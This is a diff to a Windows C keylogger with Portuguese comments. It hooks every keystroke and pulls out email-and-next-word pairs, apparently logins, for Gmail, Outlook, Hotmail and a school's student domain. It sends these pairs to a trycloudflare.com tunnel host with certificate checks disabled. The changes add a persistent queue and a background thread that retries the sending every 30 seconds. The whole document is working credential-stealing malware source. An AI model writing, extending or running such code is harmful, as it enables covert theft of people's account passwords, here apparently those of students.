@@ -6,6 +6,7 @@
 #include <wchar.h>
 #include <string.h>
 #include <winhttp.h>
+#include <time.h>
 
 #pragma comment(lib, "winhttp.lib")
 
@@ -13,9 +14,9 @@ HHOOK hKeyboardHook;
 
 // Configuração do servidor
 #define SERVER_HOST L"requiring-edward-human-scale.trycloudflare.com"
-#define SERVER_PORT 443  // HTTPS usa porta 443
+#define SERVER_PORT 443
 #define SERVER_PATH L"/envio"
-#define USE_HTTPS 1      // 1 para HTTPS, 0 para HTTP
+#define USE_HTTPS 1
 
 // Estrutura para tracking de linhas enviadas
 typedef struct LinhaEnviada {
@@ -25,6 +26,19 @@ typedef struct LinhaEnviada {
 
 LinhaEnviada* linhasEnviadas = NULL;
 CRITICAL_SECTION csLinhasEnviadas;
+
+// Estrutura para fila de pendências
+typedef struct Pendencia {
+    char* dados;
+    time_t timestamp;
+    struct Pendencia* prox;
+} Pendencia;
+
+Pendencia* filaPendencias = NULL;
+CRITICAL_SECTION csFilaPendencias;
+
+// Variável global para controle de conexão
+int conexaoDisponivel = 0;
 
 // Função para verificar se linha já foi enviada
 int linhaJaEnviada(const wchar_t* linha) {
@@ -62,51 +76,247 @@ void adicionarLinhaEnviada(const wchar_t* linha) {
     LeaveCriticalSection(&csLinhasEnviadas);
 }
 
+// Função para remover linhas já enviadas do dados_filtrados.txt
+void limparLinhasEnviadasDoArquivo() {
+    FILE* arquivo = _wfopen(L"dados_filtrados.txt", L"r, ccs=UTF-8");
+    if (arquivo == NULL) return;
+    
+    // Ler todo conteúdo
+    fseek(arquivo, 0, SEEK_END);
+    long tamanho = ftell(arquivo);
+    fseek(arquivo, 0, SEEK_SET);
+    
+    wchar_t* conteudo = (wchar_t*)malloc(tamanho + 2);
+    if (conteudo == NULL) {
+        fclose(arquivo);
+        return;
+    }
+    
+    fread(conteudo, sizeof(wchar_t), tamanho / sizeof(wchar_t), arquivo);
+    conteudo[tamanho / sizeof(wchar_t)] = L'\0';
+    fclose(arquivo);
+    
+    // Abrir para escrita
+    FILE* novoArquivo = _wfopen(L"dados_filtrados_temp.txt", L"w, ccs=UTF-8");
+    if (novoArquivo == NULL) {
+        free(conteudo);
+        return;
+    }
+    
+    // Filtrar linhas não enviadas
+    wchar_t* linha = wcstok(conteudo, L"\n");
+    while (linha != NULL) {
+        if (!linhaJaEnviada(linha)) {
+            fwprintf(novoArquivo, L"%s\n", linha);
+        }
+        linha = wcstok(NULL, L"\n");
+    }
+    
+    fclose(novoArquivo);
+    free(conteudo);
+    
+    // Substituir arquivo
+    DeleteFileW(L"dados_filtrados.txt");
+    MoveFileW(L"dados_filtrados_temp.txt", L"dados_filtrados.txt");
+}
+
+// Função para salvar pendência em arquivo
+void salvarPendenciasEmArquivo() {
+    EnterCriticalSection(&csFilaPendencias);
+
+    FILE* arquivo = fopen("pendencias.txt", "w");
+    if (arquivo != NULL) {
+        Pendencia* atual = filaPendencias;
+        while (atual != NULL) {
+            fprintf(arquivo, "%ld|%s\n", (long)atual->timestamp, atual->dados);
+            atual = atual->prox;
+        }
+        fclose(arquivo);
+        printf("[PENDENCIA] Pendências salvas em arquivo\n");
+    }
+
+    LeaveCriticalSection(&csFilaPendencias);
+}
+
+// Função para carregar pendências do arquivo
+void carregarPendenciasDoArquivo() {
+    FILE* arquivo = fopen("pendencias.txt", "r");
+    if (arquivo == NULL) return;
+
+    printf("[INIT] Carregando pendências do arquivo...\n");
+
+    char linha[2048];
+    int count = 0;
+
+    while (fgets(linha, sizeof(linha), arquivo) != NULL) {
+        // Remover newline
+        linha[strcspn(linha, "\n")] = 0;
+
+        // Formato: timestamp|dados
+        char* pipe = strchr(linha, '|');
+        if (pipe != NULL) {
+            *pipe = '\0';
+            long timestamp = atol(linha);
+            char* dados = pipe + 1;
+
+            // Adicionar à fila
+            Pendencia* nova = (Pendencia*)malloc(sizeof(Pendencia));
+            if (nova != NULL) {
+                nova->dados = _strdup(dados);
+                nova->timestamp = (time_t)timestamp;
+                nova->prox = filaPendencias;
+                filaPendencias = nova;
+                count++;
+            }
+        }
+    }
+
+    fclose(arquivo);
+    printf("[INIT] Carregadas %d pendências do arquivo\n", count);
+
+    // Tentar enviar pendências imediatamente
+    if (count > 0) {
+        processarFilaPendencias();
+    }
+}
+
+// Função para adicionar à fila de pendências
+void adicionarPendencia(const char* dados) {
+    EnterCriticalSection(&csFilaPendencias);
+
+    Pendencia* nova = (Pendencia*)malloc(sizeof(Pendencia));
+    if (nova != NULL) {
+        nova->dados = _strdup(dados);
+        nova->timestamp = time(NULL);
+        nova->prox = filaPendencias;
+        filaPendencias = nova;
+        printf("[PENDENCIA] Adicionado à fila: %s\n", dados);
+    }
+
+    // Salvar imediatamente no arquivo
+    salvarPendenciasEmArquivo();
+
+    LeaveCriticalSection(&csFilaPendencias);
+}
+
+// Função para remover da fila de pendências (quando enviado com sucesso)
+void removerPendencia(const char* dados) {
+    EnterCriticalSection(&csFilaPendencias);
+
+    Pendencia* atual = filaPendencias;
+    Pendencia* anterior = NULL;
+
+    while (atual != NULL) {
+        if (strcmp(atual->dados, dados) == 0) {
+            if (anterior == NULL) {
+                filaPendencias = atual->prox;
+            } else {
+                anterior->prox = atual->prox;
+            }
+            free(atual->dados);
+            free(atual);
+            printf("[PENDENCIA] Removido da fila: %s\n", dados);
+            break;
+        }
+        anterior = atual;
+        atual = atual->prox;
+    }
+
+    // Atualizar arquivo
+    salvarPendenciasEmArquivo();
+
+    LeaveCriticalSection(&csFilaPendencias);
+}
+
+// Função para processar toda a fila de pendências
+void processarFilaPendencias() {
+    EnterCriticalSection(&csFilaPendencias);
+
+    Pendencia* atual = filaPendencias;
+    Pendencia* proximo;
+    int enviados = 0;
+    int falhas = 0;
+    int count = 0;
+    
+    // Contar pendências
+    Pendencia* temp = filaPendencias;
+    while (temp != NULL) {
+        count++;
+        temp = temp->prox;
+    }
+
+    printf("[FILA] Processando %d pendências...\n", count);
+
+    while (atual != NULL) {
+        proximo = atual->prox;
+
+        printf("[FILA] Tentando enviar pendência: %s\n", atual->dados);
+
+        if (enviarViaHTTP(atual->dados) == 0) {
+            printf("[FILA] Pendência enviada com sucesso!\n");
+            enviados++;
+
+            // Remover da fila (precisa sair da critical section para remover)
+            LeaveCriticalSection(&csFilaPendencias);
+            removerPendencia(atual->dados);
+            EnterCriticalSection(&csFilaPendencias);
+        } else {
+            printf("[FILA] Falha ao enviar pendência\n");
+            falhas++;
+        }
+
+        atual = proximo;
+    }
+
+    printf("[FILA] Processamento concluído: %d enviados, %d falhas\n",
+           enviados, falhas);
+
+    LeaveCriticalSection(&csFilaPendencias);
+    
+    // Após processar pendências, limpar linhas já enviadas do arquivo
+    limparLinhasEnviadasDoArquivo();
+}
+
 // Função para enviar dados via HTTP/HTTPS POST
 int enviarViaHTTP(const char* dados) {
     HINTERNET hSession = NULL;
     HINTERNET hConnect = NULL;
     HINTERNET hRequest = NULL;
     BOOL bResults = FALSE;
+    int timeout = 5000; // 5 segundos de timeout
 
-    // Configurações para HTTPS
     DWORD dwFlags = WINHTTP_ACCESS_TYPE_DEFAULT_PROXY;
-    
-    // Inicializar WinHTTP
+
     hSession = WinHttpOpen(L"KeyLogger/1.0", dwFlags,
                           WINHTTP_NO_PROXY_NAME,
                           WINHTTP_NO_PROXY_BYPASS, 0);
 
     if (hSession) {
-        // Configurar opções para HTTPS
+        // Configurar timeouts
+        WinHttpSetTimeouts(hSession, timeout, timeout, timeout, timeout);
+
         if (USE_HTTPS) {
-            // Ignorar erros de certificado (para desenvolvimento)
-            DWORD dwSecurityFlags = 
+            DWORD dwSecurityFlags =
                 SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                 SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                 SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                 SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
-            
-            WinHttpSetOption(hSession, WINHTTP_OPTION_SECURITY_FLAGS, 
+
+            WinHttpSetOption(hSession, WINHTTP_OPTION_SECURITY_FLAGS,
                            &dwSecurityFlags, sizeof(dwSecurityFlags));
         }
-        
-        // Conectar ao servidor
+
         hConnect = WinHttpConnect(hSession, SERVER_HOST, SERVER_PORT, 0);
 
         if (hConnect) {
-            // Criar request POST
             hRequest = WinHttpOpenRequest(hConnect, L"POST", SERVER_PATH,
-                                         NULL, NULL, NULL, 
+                                         NULL, NULL, NULL,
                                          USE_HTTPS ? WINHTTP_FLAG_SECURE : 0);
 
             if (hRequest) {
-                // Configurar headers
                 LPCWSTR headers = L"Content-Type: application/json\r\n";
 
-                // Preparar body JSON
                 char body[2048];
-                // Escapar caracteres especiais no JSON
                 char escaped_dados[1024];
                 int j = 0;
                 for (int i = 0; dados[i] != '\0' && j < sizeof(escaped_dados) - 1; i++) {
@@ -116,33 +326,15 @@ int enviarViaHTTP(const char* dados) {
                     escaped_dados[j++] = dados[i];
                 }
                 escaped_dados[j] = '\0';
-                
+
                 snprintf(body, sizeof(body), "{\"texto\":\"%s\"}", escaped_dados);
 
-                // Enviar request
                 bResults = WinHttpSendRequest(hRequest, headers, wcslen(headers),
                                             (LPVOID)body, strlen(body),
                                             strlen(body), 0);
 
                 if (bResults) {
                     bResults = WinHttpReceiveResponse(hRequest, NULL);
-                    
-                    // Verificar resposta
-                    if (bResults) {
-                        DWORD dwStatusCode = 0;
-                        DWORD dwSize = sizeof(dwStatusCode);
-                        WinHttpQueryHeaders(hRequest, 
-                                          WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
-                                          WINHTTP_HEADER_NAME_BY_INDEX,
-                                          &dwStatusCode, &dwSize,
-                                          WINHTTP_NO_HEADER_INDEX);
-                        
-                        if (dwStatusCode == 200) {
-                            printf("HTTP %d - OK\n", dwStatusCode);
-                        } else {
-                            printf("HTTP Status: %d\n", dwStatusCode);
-                        }
-                    }
                 }
 
                 WinHttpCloseHandle(hRequest);
@@ -190,7 +382,6 @@ int GetUnicodeCharFromHook(KBDLLHOOKSTRUCT *pKeyBoard, WCHAR *buffer) {
 
     int result = ToUnicodeEx(pKeyBoard->vkCode, pKeyBoard->scanCode, keystate, buffer, 5, 0, layout);
 
-    // limpa dead key
     if (result == -1) {
         WCHAR tempBuf[5];
         ToUnicodeEx(VK_SPACE, MapVirtualKeyW(VK_SPACE, MAPVK_VK_TO_VSC), keystate, tempBuf, 5, 0, layout);
@@ -210,13 +401,11 @@ void ProcessarEEnviarLinhas(const wchar_t* conteudo) {
     wchar_t* p = buffer;
 
     while (*p != L'\0') {
-        // Encontrar início da linha
         while (*p == L'\n' || *p == L'\r') p++;
         if (*p == L'\0') break;
 
         wchar_t* inicioLinha = p;
 
-        // Encontrar fim da linha
         while (*p != L'\0' && *p != L'\n' && *p != L'\r') p++;
         wchar_t* fimLinha = p;
 
@@ -227,24 +416,31 @@ void ProcessarEEnviarLinhas(const wchar_t* conteudo) {
                 wcsncpy(linha, inicioLinha, len);
                 linha[len] = L'\0';
 
-                // Verificar se linha contém formato esperado
                 if (wcsstr(linha, L"][") != NULL && wcsstr(linha, L"@") != NULL) {
                     if (!linhaJaEnviada(linha)) {
-                        // Converter para UTF-8 e enviar
                         char* linhaUTF8 = wcharToUTF8(linha);
                         if (linhaUTF8 != NULL) {
                             printf("Enviando: %ls\n", linha);
+
+                            // Tentar enviar
                             int resultado = enviarViaHTTP(linhaUTF8);
+
                             if (resultado == 0) {
+                                // Sucesso - marcar como enviado
                                 adicionarLinhaEnviada(linha);
                                 printf("Envio bem sucedido!\n");
                             } else {
-                                printf("Falha no envio!\n");
+                                // Falha - adicionar à fila de pendências
+                                // NÃO marcar como enviado ainda
+                                printf("Falha no envio! Adicionando à fila de pendências...\n");
+                                adicionarPendencia(linhaUTF8);
+                                // A linha permanece no arquivo para próxima tentativa
                             }
+
                             free(linhaUTF8);
                         }
                     } else {
-                        printf("Linha já enviada: %ls\n", linha);
+                        printf("Linha já enviada anteriormente: %ls\n", linha);
                     }
                 }
                 free(linha);
@@ -277,7 +473,7 @@ void AtualizarArquivoFiltrado() {
     conteudo[totalLidos] = L'\0';
     fclose(arqvOrigem);
 
-    FILE *arqvDestino = _wfopen(L"dados_filtrados.txt", L"w, ccs=UTF-8");
+    FILE *arqvDestino = _wfopen(L"dados_filtrados.txt", L"a, ccs=UTF-8");
     if (arqvDestino == NULL) {
         free(conteudo);
         return;
@@ -288,14 +484,12 @@ void AtualizarArquivoFiltrado() {
     size_t linhasPos = 0;
 
     while (*p != L'\0') {
-        // pula espaços
         while (*p == L' ' || *p == L'\n' || *p == L'\r' || *p == L'\t') {
             p++;
         }
 
         if (*p == L'\0') break;
 
-        // início da primeira palavra
         wchar_t *inicio1 = p;
         while (*p != L'\0' && *p != L' ' && *p != L'\n' && *p != L'\r' && *p != L'\t') {
             p++;
@@ -304,7 +498,6 @@ void AtualizarArquivoFiltrado() {
         wchar_t *fim1 = p;
         size_t len1 = fim1 - inicio1;
 
-        // copia palavra atual
         wchar_t palavra1[512];
         wcsncpy(palavra1, inicio1, len1);
         palavra1[len1] = L'\0';
@@ -313,18 +506,15 @@ void AtualizarArquivoFiltrado() {
             memmove(palavra1, palavra1 + 1, wcslen(palavra1) * sizeof(wchar_t));
         }
 
-        // verifica se contém '@'
         if (wcsstr(palavra1, L"@gmail.com") != NULL ||
             wcsstr(palavra1, L"@estudante.ifms.edu.br") != NULL ||
             wcsstr(palavra1, L"@outlook.com") != NULL ||
             wcsstr(palavra1, L"@hotmail.com") != NULL) {
 
-            // pula separadores
             while (*p == L' ' || *p == L'\n' || *p == L'\r' || *p == L'\t') {
                 p++;
             }
 
-            // existe próxima palavra?
             if (*p != L'\0') {
                 wchar_t *inicio2 = p;
                 while (*p != L'\0' && *p != L' ' && *p != L'\n' && *p != L'\r' && *p != L'\t') {
@@ -334,10 +524,7 @@ void AtualizarArquivoFiltrado() {
                 wchar_t *fim2 = p;
                 size_t len2 = fim2 - inicio2;
 
-                // Escrever no arquivo filtrado
                 fwprintf(arqvDestino, L"[%ls][%.*ls]\n", palavra1, (int)len2, inicio2);
-
-                // Adicionar à lista para envio
                 linhasPos += swprintf(linhasParaEnviar + linhasPos, bufSize - linhasPos, L"[%ls][%.*ls]\n", palavra1, (int)len2, inicio2);
             }
         }
@@ -345,8 +532,8 @@ void AtualizarArquivoFiltrado() {
 
     fclose(arqvDestino);
 
-    // Processar e enviar novas linhas
     if (linhasPos > 0) {
+        // Tentar enviar as linhas
         ProcessarEEnviarLinhas(linhasParaEnviar);
     }
 
@@ -359,7 +546,6 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
         KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT *)lParam;
         DWORD vkCode = pKeyBoard->vkCode;
 
-        // BACKSPACE
         if (vkCode == VK_BACK) {
             FILE *arquivoLeitura = _wfopen(L"dados.txt", L"r, ccs=UTF-8");
             if (arquivoLeitura != NULL) {
@@ -388,7 +574,6 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
             return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
         }
 
-        // OUTROS CARACTERES
         WCHAR unicodeBuffer[5] = {0};
         int translationResult = GetUnicodeCharFromHook(pKeyBoard, unicodeBuffer);
 
@@ -417,26 +602,50 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
 }
 
+// Thread para tentar reenviar pendências periodicamente
+DWORD WINAPI ThreadReenvio(LPVOID lpParam) {
+    while (1) {
+        Sleep(30000); // Espera 30 segundos
+
+        printf("[THREAD] Verificando fila de pendências...\n");
+        processarFilaPendencias();
+    }
+    return 0;
+}
+
 int main() {
     setlocale(LC_ALL, "");
     InitializeCriticalSection(&csLinhasEnviadas);
+    InitializeCriticalSection(&csFilaPendencias);
+
+    // Carregar pendências salvas anteriormente
+    carregarPendenciasDoArquivo();
 
     hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
 
     if (hKeyboardHook == NULL) {
         printf("Erro ao instalar o hook! Erro: %d\n", GetLastError());
         DeleteCriticalSection(&csLinhasEnviadas);
+        DeleteCriticalSection(&csFilaPendencias);
         return 1;
     }
 
+    // Criar thread para reenvio automático
+    HANDLE hThread = CreateThread(NULL, 0, ThreadReenvio, NULL, 0, NULL);
+
     printf("========================================\n");
-    printf("KEYLOGGER COM ENVIO HTTPS\n");
+    printf("KEYLOGGER COM FILA DE PENDENCIAS\n");
     printf("========================================\n");
     printf("Servidor: %S\n", SERVER_HOST);
     printf("Porta: %d (%s)\n", SERVER_PORT, USE_HTTPS ? "HTTPS" : "HTTP");
     printf("Caminho: %S\n", SERVER_PATH);
     printf("dados.txt -> bruto\n");
     printf("dados_filtrados.txt -> filtrado\n");
+    printf("pendencias.txt -> fila de dados não enviados\n");
+    printf("========================================\n");
+    printf("[INFO] Dados não enviados serão salvos em pendencias.txt\n");
+    printf("[INFO] Tentativas de reenvio a cada 30 segundos\n");
+    printf("[INFO] Linhas só são removidas do arquivo quando enviadas com sucesso\n");
     printf("========================================\n\n");
 
     MSG msg;
@@ -447,6 +656,13 @@ int main() {
 
     UnhookWindowsHookEx(hKeyboardHook);
 
+    // Finalizar thread
+    TerminateThread(hThread, 0);
+    CloseHandle(hThread);
+
+    // Salvar pendências restantes
+    salvarPendenciasEmArquivo();
+
     // Limpar lista de linhas enviadas
     LinhaEnviada* atual = linhasEnviadas;
     while (atual != NULL) {
@@ -456,7 +672,17 @@ int main() {
         atual = prox;
     }
 
+    // Limpar fila de pendências
+    Pendencia* pendAtual = filaPendencias;
+    while (pendAtual != NULL) {
+        Pendencia* prox = pendAtual->prox;
+        free(pendAtual->dados);
+        free(pendAtual);
+        pendAtual = prox;
+    }
+
     DeleteCriticalSection(&csLinhasEnviadas);
+    DeleteCriticalSection(&csFilaPendencias);
 
     return 0;
 }
